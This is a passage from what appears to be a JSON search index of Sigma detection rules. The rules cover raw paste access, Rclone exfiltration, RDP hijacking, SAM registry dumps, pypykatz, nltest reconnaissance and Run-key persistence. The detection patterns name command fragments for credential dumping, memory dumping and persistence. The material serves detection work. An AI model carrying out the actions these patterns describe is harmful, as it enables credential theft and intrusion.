\u0026#39;C:\\Windows\\WinSxS\\\u0026#39; - \u0026#39;C:\\Windows\\servicing\\\u0026#39; - \u0026#39;C:\\Windows\\CCM\\\u0026#39; - \u0026#39;C:\\Windows\\uus\\\u0026#39; - \u0026#39;C:\\Windows\\WinSxs\\\u0026#39; filter_3: ProcessId: 4 filter_specific: Image: - \u0026#39;C:\\Windows\\UUS\\amd64\\MoUsoCoreWorker.exe\u0026#39; - \u0026#39;C:\\Windows\\explorer.exe\u0026#39; filter_system: Image: - \u0026#39;System\u0026#39; - \u0026#39;Registry\u0026#39; filter_Keybase: Image|endswith: \u0026#39;\\Keybase\\upd.exe\u0026#39; filter_windefender: Image|startswith: \u0026#39;C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\\u0026#39; Image|endswith: \u0026#39;\\MsMpEng.exe\u0026#39; filter_programfiles: # this rule causes so many FPs that we have to do this Image|startswith: - \u0026#39;C:\\Program Files\\\u0026#39; - \u0026#39;C:\\Program Files (x86)\\\u0026#39; filter_appdata: Image|contains|all: - \u0026#39;C:\\Users\\\u0026#39; - \u0026#39;\\AppData\\\u0026#39; - \u0026#39;\\Microsoft\\\u0026#39; filter_startmenu_xphost: Image|startswith: \u0026#39;C:\\Windows\\SystemApps\\Microsoft.Windows.StartMenuExperienceHost\u0026#39; Image|endswith: \u0026#39;\\StartMenuExperienceHost.exe\u0026#39; condition: not 1 of filter_* fields: - ComputerName - Image - ProcessID - Device falsepositives: - Legitimate Administrator using tool for raw access or ongoing forensic investigation level: low # far too many false positives ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/raw_access_thread/sysmon_raw_disk_access_using_illegitimate_tools.yml/","tags":["attack.defense_evasion","attack.t1006"],"title":"Raw Disk Access Using Illegitimate Tools"},{"categories":null,"contents":"Detects direct access to raw pastes in different paste services often used by malware in their second stages to download malicious code in encrypted or encoded form\nKnown false-positives User activity (e.g. developer that shared and copied code snippets and used the raw link instead of just copy \u0026amp; paste) References https://www.virustotal.com/gui/domain/paste.ee/relations Raw rule (edit) title: Raw Paste Service Access id: 5468045b-4fcc-4d1a-973c-c9c9578edacb status: test description: Detects direct access to raw pastes in different paste services often used by malware in their second stages to download malicious code in encrypted or encoded form author: Florian Roth references: - https://www.virustotal.com/gui/domain/paste.ee/relations date: 2019/12/05 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri|contains: - \u0026#39;.paste.ee/r/\u0026#39; - \u0026#39;.pastebin.com/raw/\u0026#39; - \u0026#39;.hastebin.com/raw/\u0026#39; - \u0026#39;.ghostbin.co/paste/*/raw/\u0026#39; condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - User activity (e.g. developer that shared and copied code snippets and used the raw link instead of just copy \u0026amp; paste) level: high tags: - attack.command_and_control - attack.t1071.001 - attack.t1102.001 - attack.t1102.003 - attack.defense_evasion ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_raw_paste_service_access.yml/","tags":["attack.command_and_control","attack.t1071.001","attack.t1102.001","attack.t1102.003","attack.defense_evasion"],"title":"Raw Paste Service Access"},{"categories":null,"contents":"Detects Rclone config file being created\nKnown false-positives Legitimate Rclone usage (rare) References https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/ Raw rule (edit) title: Rclone Config File Creation id: 34986307-b7f4-49be-92f3-e7a4d01ac5db description: Detects Rclone config file being created status: experimental date: 2021/05/26 modified: 2021/10/04 author: Aaron Greetham (@beardofbinary) - NCC Group references: - https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/ tags: - attack.exfiltration - attack.t1567.002 falsepositives: - Legitimate Rclone usage (rare) level: high logsource: product: windows category: file_event detection: file_selection: TargetFilename|contains|all: - \u0026#39;:\\Users\\\u0026#39; - \u0026#39;\\.config\\rclone\\\u0026#39; condition: file_selection ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_rclone_exec_file.yml/","tags":["attack.exfiltration","attack.t1567.002"],"title":"Rclone Config File Creation"},{"categories":null,"contents":"Detects changes to RDP terminal service sensitive settings\nKnown false-positives unknown References https://blog.menasec.net/2019/02/threat-hunting-rdp-hijacking-via.html https://knowledge.insourcess.com/Supporting_Technologies/Wonderware/Tech_Notes/TN_WW213_How_to_shadow_an_established_RDP_Session_on_Windows_10_Pro https://twitter.com/SagieSec/status/1469001618863624194?t=HRf0eA0W1YYzkTSHb-Ky1A\u0026amp;s=03 http://etutorials.org/Microsoft+Products/microsoft+windows+server+2003+terminal+services/Chapter+6+Registry/Registry+Keys+for+Terminal+Services/ Raw rule (edit) title: RDP Sensitive Settings Changed id: 171b67e1-74b4-460e-8d55-b331f3e32d67 status: test description: Detects changes to RDP terminal service sensitive settings author: Samir Bousseaden, David ANDRE references: - https://blog.menasec.net/2019/02/threat-hunting-rdp-hijacking-via.html - https://knowledge.insourcess.com/Supporting_Technologies/Wonderware/Tech_Notes/TN_WW213_How_to_shadow_an_established_RDP_Session_on_Windows_10_Pro - https://twitter.com/SagieSec/status/1469001618863624194?t=HRf0eA0W1YYzkTSHb-Ky1A\u0026amp;s=03 - http://etutorials.org/Microsoft+Products/microsoft+windows+server+2003+terminal+services/Chapter+6+Registry/Registry+Keys+for+Terminal+Services/ date: 2019/04/03 modified: 2021/12/31 logsource: category: registry_event product: windows detection: selection_reg: TargetObject|contains: - \u0026#39;\\services\\TermService\\Parameters\\ServiceDll\u0026#39; - \u0026#39;\\Control\\Terminal Server\\fSingleSessionPerUser\u0026#39; - \u0026#39;\\Control\\Terminal Server\\fDenyTSConnections\u0026#39; - \u0026#39;\\Policies\\Microsoft\\Windows NT\\Terminal Services\\Shadow\u0026#39; - \u0026#39;\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\InitialProgram\u0026#39; condition: selection_reg falsepositives: - unknown level: high tags: - attack.defense_evasion - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_rdp_settings_hijack.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"RDP Sensitive Settings Changed"},{"categories":null,"contents":"Detects uses of the rdrleakdiag.exe LOLOBIN utility to dump process memory\nKnown false-positives Unknown References https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/ Raw rule (edit) title: RdrLeakDiag Process Dump id: 6355a919-2e97-4285-a673-74645566340d description: Detects uses of the rdrleakdiag.exe LOLOBIN utility to dump process memory status: experimental references: - https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/ author: Florian Roth date: 2022/01/04 tags: - attack.defense_evasion - attack.t1036 - attack.t1003.001 logsource: category: process_creation product: windows detection: selection1: Image|endswith: \u0026#39;\\rdrleakdiag.exe\u0026#39; CommandLine|contains|all: - \u0026#39;/fullmemdmp\u0026#39; selection2: CommandLine|contains|all: - \u0026#39;/fullmemdmp\u0026#39; - \u0026#39; /o \u0026#39; - \u0026#39; /p \u0026#39; condition: selection1 or selection2 falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_proc_dump_rdrleakdiag.yml/","tags":["attack.defense_evasion","attack.t1036","attack.t1003.001"],"title":"RdrLeakDiag Process Dump"},{"categories":null,"contents":"Detects nltest commands that can be used for information discovery\nKnown false-positives Legitimate administration use but user must be check out References https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11) https://thedfirreport.com/2021/08/16/trickbot-leads-up-to-fake-1password-installation/ https://attack.mitre.org/techniques/T1482/ https://attack.mitre.org/techniques/T1016/ https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters Raw rule (edit) title: Recon Activity with NLTEST id: 5cc90652-4cbd-4241-aa3b-4b462fa5a248 description: Detects nltest commands that can be used for information discovery references: - https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11) - https://thedfirreport.com/2021/08/16/trickbot-leads-up-to-fake-1password-installation/ - https://attack.mitre.org/techniques/T1482/ - https://attack.mitre.org/techniques/T1016/ - https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters status: experimental author: Craig Young, oscd.community, Georg Lauenstein date: 2021/07/24 modified: 2021/08/19 tags: - attack.discovery - attack.t1016 - attack.t1482 logsource: category: process_creation product: windows detection: selection_nltest: Image|endswith: \u0026#39;\\nltest.exe\u0026#39; selection_recon1: CommandLine|contains|all: - \u0026#39;/server\u0026#39; - \u0026#39;/query\u0026#39; selection_recon2: CommandLine|contains: - \u0026#39;/dclist:\u0026#39; - \u0026#39;/parentdomain\u0026#39; - \u0026#39;/domain_trusts\u0026#39; - \u0026#39;/trusted_domains\u0026#39; - \u0026#39;/user\u0026#39; condition: selection_nltest and (selection_recon1 or selection_recon2) falsepositives: - Legitimate administration use but user must be check out level: medium fields: - Image - User - CommandLine - ParentCommandLine ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_nltest_recon.yml/","tags":["attack.discovery","attack.t1016","attack.t1482"],"title":"Recon Activity with NLTEST"},{"categories":null,"contents":"Detects activity as \u0026ldquo;net user administrator /domain\u0026rdquo; and \u0026ldquo;net group domain admins /domain\u0026rdquo;\nKnown false-positives Administrator activity Penetration tests References https://findingbad.blogspot.de/2017/01/hunting-what-does-it-look-like.html Raw rule (edit) title: Reconnaissance Activity id: 968eef52-9cff-4454-8992-1e74b9cbad6c status: test description: Detects activity as \u0026#34;net user administrator /domain\u0026#34; and \u0026#34;net group domain admins /domain\u0026#34; author: Florian Roth (rule), Jack Croock (method), Jonhnathan Ribeiro (improvements), oscd.community references: - https://findingbad.blogspot.de/2017/01/hunting-what-does-it-look-like.html date: 2017/03/07 modified: 2021/11/27 logsource: product: windows service: security definition: The volume of Event ID 4661 is high on Domain Controllers and therefore \u0026#34;Audit SAM\u0026#34; and \u0026#34;Audit Kernel Object\u0026#34; advanced audit policy settings are not configured in the recommendations for server systems detection: selection: EventID: 4661 ObjectType: - \u0026#39;SAM_USER\u0026#39; - \u0026#39;SAM_GROUP\u0026#39; ObjectName|startswith: \u0026#39;S-1-5-21-\u0026#39; AccessMask: \u0026#39;0x2d\u0026#39; selection2: ObjectName|endswith: - \u0026#39;-500\u0026#39; - \u0026#39;-512\u0026#39; condition: selection and selection2 falsepositives: - Administrator activity - Penetration tests level: high tags: - attack.discovery - attack.t1087.002 - attack.t1069.002 - attack.s0039 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_net_recon_activity.yml/","tags":["attack.discovery","attack.t1087.002","attack.t1069.002","attack.s0039"],"title":"Reconnaissance Activity"},{"categories":null,"contents":"Detects actions caused by the RedMimicry Winnti playbook\nKnown false-positives Unknown References https://redmimicry.com Raw rule (edit) title: RedMimicry Winnti Playbook Dropped File id: 130c9e58-28ac-4f83-8574-0a4cc913b97e status: test description: Detects actions caused by the RedMimicry Winnti playbook author: Alexander Rausch references: - https://redmimicry.com date: 2020/06/24 modified: 2021/11/27 logsource: product: windows category: file_event detection: selection: TargetFilename|contains: - gthread-3.6.dll - sigcmm-2.4.dll - \\Windows\\Temp\\tmp.bat condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_redmimicry_winnti_filedrop.yml/","tags":["attack.defense_evasion","attack.t1027"],"title":"RedMimicry Winnti Playbook Dropped File"},{"categories":null,"contents":"Detects actions caused by the RedMimicry Winnti playbook\nKnown false-positives Unknown References https://redmimicry.com Raw rule (edit) title: RedMimicry Winnti Playbook Execute id: 95022b85-ff2a-49fa-939a-d7b8f56eeb9b status: test description: Detects actions caused by the RedMimicry Winnti playbook author: Alexander Rausch references: - https://redmimicry.com date: 2020/06/24 modified: 2021/11/27 logsource: product: windows category: process_creation detection: selection: Image|contains: - rundll32.exe - cmd.exe CommandLine|contains: - gthread-3.6.dll - \\Windows\\Temp\\tmp.bat - sigcmm-2.4.dll condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.defense_evasion - attack.t1106 - attack.t1059.003 - attack.t1218.011 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_redmimicry_winnti_proc.yml/","tags":["attack.execution","attack.defense_evasion","attack.t1106","attack.t1059.003","attack.t1218.011"],"title":"RedMimicry Winnti Playbook Execute"},{"categories":null,"contents":"Detects actions caused by the RedMimicry Winnti playbook\nKnown false-positives Unknown References https://redmimicry.com Raw rule (edit) title: RedMimicry Winnti Playbook Registry Manipulation id: 5b175490-b652-4b02-b1de-5b5b4083c5f8 status: test description: Detects actions caused by the RedMimicry Winnti playbook author: Alexander Rausch references: - https://redmimicry.com date: 2020/06/24 modified: 2021/11/27 logsource: product: windows category: registry_event detection: selection: TargetObject|contains: HKLM\\SOFTWARE\\Microsoft\\HTMLHelp\\data condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_redmimicry_winnti_reg.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"RedMimicry Winnti Playbook Registry Manipulation"},{"categories":null,"contents":"Detects suspicious command line reg.exe tool adding key to RUN key in Registry\nKnown false-positives Unknown References https://app.any.run/tasks/9c0f37bc-867a-4314-b685-e101566766d7/ https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys Raw rule (edit) title: Reg Add RUN Key id: de587dce-915e-4218-aac4-835ca6af6f70 description: Detects suspicious command line reg.exe tool adding key to RUN key in Registry status: experimental date: 2021/06/28 author: Florian Roth references: - https://app.any.run/tasks/9c0f37bc-867a-4314-b685-e101566766d7/ - https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;reg\u0026#39; - \u0026#39; ADD \u0026#39; - \u0026#39;Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.persistence - attack.t1547.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_reg_add_run_key.yml/","tags":["attack.persistence","attack.t1547.001"],"title":"Reg Add RUN Key"},{"categories":null,"contents":"Detects a regedit started with TrustedInstaller privileges or by ProcessHacker.exe\nKnown false-positives Unlikely References https://twitter.com/1kwpeter/status/1397816101455765504 Raw rule (edit) title: Regedit as Trusted Installer id: 883835a7-df45-43e4-bf1d-4268768afda4 description: Detects a regedit started with TrustedInstaller privileges or by ProcessHacker.exe status: experimental references: - https://twitter.com/1kwpeter/status/1397816101455765504 author: Florian Roth date: 2021/05/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\regedit.exe\u0026#39; ParentImage|endswith: - \u0026#39;\\TrustedInstaller.exe\u0026#39; - \u0026#39;\\ProcessHacker.exe\u0026#39; condition: selection falsepositives: - Unlikely level: high tags: - attack.privilege_escalation - attack.t1548 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_regedit_trustedinstaller.yml/","tags":["attack.privilege_escalation","attack.t1548"],"title":"Regedit as Trusted Installer"},{"categories":null,"contents":"Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through Windows Registry where the SAM database is stored\nKnown false-positives Unknow References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-1---registry-dump-of-sam-creds-and-secrets Raw rule (edit) title: Registry Dump of SAM Creds and Secrets id: 038cd51c-3ad8-41c5-ba8f-5d1c92f3cc1e status: experimental description: Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through Windows Registry where the SAM database is stored author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-1---registry-dump-of-sam-creds-and-secrets date: 2022/01/05 logsource: category: process_creation product: windows detection: selection_reg: CommandLine|contains: \u0026#39; save \u0026#39; selection_key: CommandLine|contains: - HKLM\\sam - HKLM\\system - HKLM\\security condition: all of selection_* falsepositives: - Unknow level: high tags: - attack.credential_access - attack.t1003.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_reg_dump_sam.yml/","tags":["attack.credential_access","attack.t1003.002"],"title":"Registry Dump of SAM Creds and Secrets"},{"categories":null,"contents":"Detects the presence of a registry key created during Azorult execution\nKnown false-positives unknown References https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/trojan.win32.azoruit.a Raw rule (edit) title: Registry Entries For Azorult Malware id: f7f9ab88-7557-4a69-b30e-0a8f91b3a0e7 status: test description: Detects the presence of a registry key created during Azorult execution author: Trent Liffick references: - https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/trojan.win32.azoruit.a date: 2020/05/08 modified: 2021/11/27 logsource: product: windows category: registry_event detection: selection: EventID: - 12 - 13 TargetObject|contains: \u0026#39;SYSTEM\\\u0026#39; TargetObject|endswith: \u0026#39;\\services\\localNETService\u0026#39; condition: selection fields: - Image - TargetObject - TargetDetails falsepositives: - unknown level: critical tags: - attack.execution - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_mal_azorult.yml/","tags":["attack.execution","attack.t1112"],"title":"Registry Entries For Azorult Malware"},{"categories":null,"contents":"Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through Windows Registry where the SAM database is stored\nKnown false-positives Unknow References https://github.com/skelsec/pypykatz https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-2---registry-parse-with-pypykatz Raw rule (edit) title: Registry Parse with Pypykatz id: a29808fd-ef50-49ff-9c7a-59a9b040b404 status: experimental description: Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through Windows Registry where the SAM database is stored author: frack113 references: - https://github.com/skelsec/pypykatz - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-2---registry-parse-with-pypykatz date: 2022/01/05 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \\pypykatz.exe - \\python.exe CommandLine|contains|all: - live - registry condition: selection falsepositives: - Unknow level: high tags: - attack.credential_access - attack.t1003.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_pypykatz.yml/","tags":["attack.credential_access","attack.t1003.002"],"title":"Registry Parse with Pypykatz"},{"categories":null,"contents":"Detects persistence method using windows telemetry\nKnown false-positives unknown References https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/ Raw rule (edit) title: Registry Persistence Mechanism via Windows Telemetry id: 73a883d0-0348-4be4-a8d8-51031c2564f8 status: test description: Detects persistence method using windows telemetry author: Lednyov Alexey, oscd.community references: - https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/ date: 2020/10/16 modified: 2022/01/13 logsource: category: registry_event product: windows definition: \u0026#39;Requirements: Sysmon config that monitors \\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController subkey of the HKLU hives\u0026#39; detection: selection: EventType: SetValue TargetObject|contains|all: - \u0026#39;\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\\u0026#39; - \u0026#39;\\Command\u0026#39; Details|contains: \u0026#39;.exe\u0026#39; filter: Details|contains: - \u0026#39;\\system32\\CompatTelRunner.exe\u0026#39; - \u0026#39;\\system32\\DeviceCensus.exe\u0026#39; condition: selection and not filter falsepositives: - unknown level: critical tags: - attack.persistence - attack.t1053.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_telemetry_persistence.yml/","tags":["attack.persistence","attack.t1053.005"],"title":"Registry Persistence Mechanism via Windows Telemetry"},{"categories":null,"contents":"Detects relevant ClamAV messages\nKnown false-positives Unknown References https://github.com/ossec/ossec-hids/blob/master/etc/rules/clam_av_rules.xml Raw rule (edit) title: Relevant ClamAV Message id: 36aa86ca-fd9d-4456-814e-d3b1b8e1e0bb status: stable description: Detects relevant ClamAV messages author: Florian Roth date: 2017/03/01 references: - https://github.com/ossec/ossec-hids/blob/master/etc/rules/clam_av_rules.xml logsource: product: linux service: clamav detection: keywords: - \u0026#39;Trojan*FOUND\u0026#39; - \u0026#39;VirTool*FOUND\u0026#39; - \u0026#39;Webshell*FOUND\u0026#39; - \u0026#39;Rootkit*FOUND\u0026#39; - \u0026#39;Htran*FOUND\u0026#39; condition: keywords falsepositives: - Unknown level: high tags: - attack.resource_development - attack.t1588.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/other/lnx_clamav.yml/","tags":["attack.resource_development","attack.t1588.001"],"title":"Relevant ClamAV Message"},{"categories":null,"contents":"Detects an attempt to execute code or create service on remote host via winrm.vbs.\nKnown false-positives Legitimate use for administartive purposes. Unlikely References https://twitter.com/bohops/status/994405551751815170 https://redcanary.com/blog/lateral-movement-winrm-wmi/ Raw rule (edit) title: Remote Code Execute via Winrm.vbs id: 9df0dd3a-1a5c-47e3-a2bc-30ed177646a0 status: test description: Detects an attempt to execute code or create service on remote host via winrm.vbs. author: Julia Fomina, oscd.community references: - https://twitter.com/bohops/status/994405551751815170 - https://redcanary.com/blog/lateral-movement-winrm-wmi/ date: 2020/10/07 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\cscript.exe\u0026#39; CommandLine|contains|all: - \u0026#39;winrm\u0026#39; - \u0026#39;invoke Create wmicimv2/Win32_\u0026#39; - \u0026#39;-r:http\u0026#39; condition: selection falsepositives: - Legitimate use for administartive purposes. Unlikely level: medium tags: - attack.defense_evasion - attack.t1216 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_winrm_execution.yml/","tags":["attack.defense_evasion","attack.t1216"],"title":"Remote Code Execute via Winrm.vbs"},{"categories":null,"contents":"Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\nKnown false-positives Unknow References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.001/T1021.001.md#t1021001---remote-desktop-protocol https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc Raw rule (edit) title: Remote Desktop Protocol Use Mstsc id: 954f0af7-62dd-418f-b3df-a84bc2c7a774 status: experimental description: Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user. author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.001/T1021.001.md#t1021001---remote-desktop-protocol - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc date: 2022/01/07 logsource: category: process_creation product: windows detection: selection_mstsc: Image|endswith: \\mstsc.exe CommandLine|contains: \u0026#39; /v:\u0026#39; selection_cmdkey: Image|endswith: \\cmdkey.exe CommandLine|contains|all: - \u0026#39;/generic:\u0026#39; - \u0026#39;/user:\u0026#39; - \u0026#39;/pass:\u0026#39; condition: 1 of selection_* falsepositives: - Unknow level: medium tags: - attack.lateral_movement - attack.t1021.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_mstsc.yml/","tags":["attack.lateral_movement","attack.t1021.001"],"title":"Remote Desktop Protocol Use Mstsc"},{"categories":null,"contents":"Remote registry management using REG utility from non-admin workstation\nKnown false-positives Legitimate usage of remote registry management by administrator References https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment Raw rule (edit) title: Remote Registry Management Using Reg Utility id: 68fcba0d-73a5-475e-a915-e8b4c576827e status: test description: Remote registry management using REG utility from non-admin workstation author: Teymur Kheirkhabarov, oscd.community references: - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment date: 2019/10/22 modified: 2021/11/27 logsource: product: windows service: security detection: selection_1: EventID: 5145 RelativeTargetName|contains: \u0026#39;\\winreg\u0026#39; filter: IpAddress: \u0026#39;%Admins_Workstations%\u0026#39; condition: selection_1 and not filter falsepositives: - Legitimate usage of remote registry management by administrator level: medium tags: - attack.defense_evasion - attack.t1112 - attack.discovery - attack.t1012 - attack.credential_access - attack.t1552.002 - attack.s0075 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_remote_registry_management_using_reg_utility.yml/","tags":["attack.defense_evasion","attack.t1112","attack.discovery","attack.t1012","attack.credential_access","attack.t1552.002","attack.s0075"],"title":"Remote Registry Management Using Reg Utility"},{"categories":null,"contents":"Detects remote service activity via remote access to the svcctl named pipe\nKnown false-positives pentesting References https://blog.menasec.net/2019/03/threat-hunting-26-remote-windows.html Raw rule (edit) title: Remote Service Activity via SVCCTL Named Pipe id: 586a8d6b-6bfe-4ad9-9d78-888cd2fe50c3 status: test description: Detects remote service activity via remote access to the svcctl named pipe author: Samir Bousseaden references: - https://blog.menasec.net/2019/03/threat-hunting-26-remote-windows.html date: 2019/04/03 modified: 2021/11/27 logsource: product: windows service: security definition: \u0026#39;The advanced audit policy setting \u0026#34;Object Access \u0026gt; Audit Detailed File Share\u0026#34; must be configured for Success/Failure\u0026#39; detection: selection: EventID: 5145 ShareName: \\\\\\*\\IPC$ RelativeTargetName: svcctl Accesses|contains: \u0026#39;WriteData\u0026#39; condition: selection falsepositives: - pentesting level: medium tags: - attack.lateral_movement - attack.persistence - attack.t1021.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_svcctl_remote_service.yml/","tags":["attack.lateral_movement","attack.persistence","attack.t1021.002"],"title":"Remote Service Activity via SVCCTL Named Pipe"},{"categories":null,"contents":"Detects remote task creation via at.exe or API interacting with ATSVC namedpipe\nKnown false-positives pentesting References https://blog.menasec.net/2019/03/threat-hunting-25-scheduled-tasks-for.html Raw rule (edit) title: Remote Task Creation via ATSVC Named Pipe id: f6de6525-4509-495a-8a82-1f8b0ed73a00 status: test description: Detects remote task creation via at.exe or API interacting with ATSVC namedpipe author: Samir Bousseaden references: - https://blog.menasec.net/2019/03/threat-hunting-25-scheduled-tasks-for.html date: 2019/04/03 modified: 2021/11/27 logsource: product: windows service: security definition: \u0026#39;The advanced audit policy setting \u0026#34;Object Access \u0026gt; Audit Detailed File Share\u0026#34; must be configured for Success/Failure\u0026#39; detection: selection: EventID: 5145 ShareName: \\\\\\*\\IPC$ RelativeTargetName: atsvc Accesses|contains: \u0026#39;WriteData\u0026#39; condition: selection falsepositives: - pentesting level: medium tags: - attack.lateral_movement - attack.persistence - car.2013-05-004 - car.2015-04-001 - attack.t1053.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_atsvc_task.yml/","tags":["attack.lateral_movement","attack.persistence","car.2013-05-004","car.2015-04-001","attack.t1053.002"],"title":"Remote Task Creation via ATSVC Named Pipe"},{"categories":null,"contents":"Detects remote task creation via at.exe or API interacting with ATSVC namedpipe\nKnown false-positives unknown References https://github.com/neo23x0/sigma/blob/d42e87edd741dd646db946f30964f331f92f50e6/rules/windows/builtin/win_atsvc_task.yml Raw rule (edit) title: Remote Task Creation via ATSVC Named Pipe - Zeek id: dde85b37-40cd-4a94-b00c-0b8794f956b5 status: test description: Detects remote task creation via at.exe or API interacting with ATSVC namedpipe author: \u0026#39;Samir Bousseaden, @neu5rn\u0026#39; references: - https://github.com/neo23x0/sigma/blob/d42e87edd741dd646db946f30964f331f92f50e6/rules/windows/builtin/win_atsvc_task.yml date: 2020/04/03 modified: 2021/11/27 logsource: product: zeek service: smb_files detection: selection: path: \\\\\\*\\IPC$ name: atsvc #Accesses: \u0026#39;*WriteData*\u0026#39; condition: selection falsepositives: - unknown level: medium tags: - attack.lateral_movement - attack.persistence - car.2013-05-004 - car.2015-04-001 - attack.t1053.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_smb_converted_win_atsvc_task.yml/","tags":["attack.lateral_movement","attack.persistence","car.2013-05-004","car.2015-04-001","attack.t1053.002"],"title":"Remote Task Creation via ATSVC Named Pipe - Zeek"},{"categories":null,"contents":"Detect potential adversaries leveraging WMI ActiveScriptEventConsumers remotely to move laterally in a network\nKnown false-positives SCCM References https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-200902020333.html Raw rule (edit) title: Remote WMI ActiveScriptEventConsumers id: 9599c180-e3a8-4743-8f92-7fb96d3be648 status: test description: Detect potential adversaries leveraging WMI ActiveScriptEventConsumers remotely to move laterally in a network author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-200902020333.html date: 2020/09/02 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4624 LogonType: 3 ProcessName|endswith: \u0026#39;scrcons.exe\u0026#39; filter: TargetLogonId: \u0026#39;0x3e7\u0026#39; condition: selection and not filter falsepositives: - SCCM level: high tags: - attack.lateral_movement - attack.privilege_escalation - attack.persistence - attack.t1546.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_scrcons_remote_wmi_scripteventconsumer.yml/","tags":["attack.lateral_movement","attack.privilege_escalation","attack.persistence","attack.t1546.003"],"title":"Remote WMI ActiveScriptEventConsumers"},{"categories":null,"contents":"Remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md https://seclists.org/fulldisclosure/2020/Mar/45 Raw 